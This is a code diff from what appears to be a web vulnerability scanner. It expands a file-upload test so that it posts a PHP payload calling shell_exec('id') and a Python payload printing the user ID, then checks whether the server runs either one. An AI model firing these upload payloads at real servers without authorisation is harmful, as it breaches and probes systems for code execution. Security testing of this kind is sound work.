@@ -5831,12 +5831,22 @@ def cmd_testers(args):
                         field = f["field"]
                         break
                 b1 = _http(u, timeout=timeout)
-                shell = '<?php echo "SMRCE:" . shell_exec("id");?>'
+                # v7.9.5 — the LANGUAGE-AMBIENT shells: the php twin includes
+                # the .php part, the python twin execs the .py part — either
+                # marker = the upload executes server-side
+                shells = (
+                    '<?php echo "SMRCE:" . shell_exec("id");?>',
+                    'import os; print("SMRCE:", os.getuid())',
+                )
                 boundary = "----SMUP"
-                body = (f"--{boundary}\r\nContent-Disposition: form-data; "
-                        f'name="{field}"; filename="sm.php"\r\n'
-                        f"Content-Type: application/x-php\r\n\r\n{shell}\r\n"
-                        f"--{boundary}--\r\n").encode()
+                parts = []
+                for fn, sh in (("sm.php", shells[0]), ("sm.py", shells[1])):
+                    parts.append(
+                        f"Content-Disposition: form-data; "
+                        f'name="{field}"; filename="{fn}"\r\n'
+                        f"Content-Type: application/x-php\r\n\r\n{sh}\r\n")
+                body = (f"--{boundary}\r\n" + f"--{boundary}\r\n".join(parts)
+                        + f"--{boundary}--\r\n").encode()
                 a = _http(u, "POST", data=body,
                           headers={"Content-Type":
                                    f"multipart/form-data; boundary={boundary}"},
